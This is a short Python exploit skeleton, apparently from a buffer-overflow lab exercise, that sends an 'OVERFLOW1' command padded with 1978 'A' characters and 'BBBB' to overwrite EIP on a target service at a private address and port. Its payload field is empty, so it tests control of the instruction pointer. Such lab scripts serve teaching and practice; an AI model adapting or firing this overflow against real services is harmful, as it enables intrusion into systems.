#/usr/bin/python
import socket

ip = "10.10.159.146"	#change me
port = 1337		#change me

prefix = "OVERFLOW1 "
offset = 1978			#1. After fuzzing the value with payload pattern_create
overflow = "A" * offset
retn = "BBBB"			#2. To overwrite the EIP
padding = ""

payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")